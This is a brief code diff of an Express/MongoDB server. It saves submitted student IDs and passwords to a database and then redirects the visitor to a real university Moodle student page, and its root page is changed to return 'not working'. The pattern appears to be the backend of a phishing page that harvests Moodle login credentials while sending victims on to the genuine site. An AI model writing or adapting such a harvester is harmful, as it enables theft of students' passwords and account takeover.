@@ -12,7 +12,7 @@ mongoose.connect(dbURI)
 
 app.use(bodyParser.urlencoded({ extended: true }));
 app.get('/', (req, res) => {
-    res.send('Hello World!')
+    res.send('not working')
 })
 app.post('/', (req, res) => {
     const ID = req.body.ID
@@ -23,7 +23,7 @@ app.post('/', (req, res) => {
         PASS: PASS
     })
     user.save();
-    res.send(user)
+    res.redirect('http://moodle.smuc.edu.et/students/')
 })
 
 app.listen(port, () => {
